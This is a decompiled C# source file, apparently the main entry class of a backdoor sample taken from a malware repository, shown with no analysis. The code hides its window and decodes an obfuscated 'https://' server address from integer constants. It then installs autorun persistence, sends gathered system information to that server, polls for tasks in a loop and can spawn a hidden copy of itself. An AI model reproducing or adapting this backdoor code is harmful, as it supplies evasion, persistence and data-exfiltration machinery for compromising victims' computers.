// Decompiled with JetBrains decompiler
// Type: JSS.App
// Assembly: JSS, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: CA27710C-27FC-4B6B-9AFB-DB45D81E1E20
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Backdoor.MSIL.Kamuza.gen-dd86898c784342fc11c42bea4c815cb536455ee709e7522fb64622d9171c465d.exe

using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace JSS
{
  internal static class App
  {
    public const string APP_NAME = "JSS";
    public const string APP_VER = "0x01";
    public static bool StopRequested;
    public static AppHttp JssHttp;

    [STAThread]
    private static int Main(string[] args)
    {
      App.HideConsole();
      if (!App.Initialize())
        return -1;
      Application.EnableVisualStyles();
      Application.SetCompatibleTextRenderingDefault(false);
      byte[] bytes = AppInfo.Combine(BitConverter.GetBytes(1886680168), BitConverter.GetBytes(791624307), BitConverter.GetBytes(2003528034), BitConverter.GetBytes(1663984229), BitConverter.GetBytes(1731161455), BitConverter.GetBytes(778400865), BitConverter.GetBytes(7366768));
      string str = Encoding.UTF8.GetString(bytes, 0, bytes.Length - 1);
      AppParams.SetArguments("32", str, str);
      if (!AppParams.LoadArgs())
        return -1;
      AppAutorun.Set();
      AppTask.SendReport(AppInfo.GetAllInfo());
      App.Run();
      AppAutorun.Reset();
      return 0;
    }

    private static bool Initialize()
    {
      try
      {
        App.JssHttp = new AppHttp();
      }
      catch (Exception ex)
      {
        return false;
      }
      return true;
    }

    private static void Run()
    {
      while (true)
      {
        DateTime now = DateTime.Now;
        AppTask.DoTask();
        if (!App.StopRequested)
          App.HoldUp(now);
        else
          break;
      }
    }

    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    private static void HideConsole()
    {
      IntPtr mainWindowHandle = Process.GetCurrentProcess().MainWindowHandle;
      if (!(mainWindowHandle != IntPtr.Zero))
        return;
      App.ShowWindow(mainWindowHandle, 0);
    }

    private static void HoldUp(DateTime theTime)
    {
      while (DateTime.Now.Subtract(theTime).TotalSeconds < (double) AppParams.MainInterval)
        Thread.Sleep(1000);
    }

    private static void StartSecondCopy()
    {
      string str = Assembly.GetExecutingAssembly().GetName().CodeBase.Replace("file:///", "");
      new Process()
      {
        StartInfo = new ProcessStartInfo()
        {
          FileName = str,
          UseShellExecute = false,
          CreateNoWindow = true
        }
      }.Start();
    }
  }
}
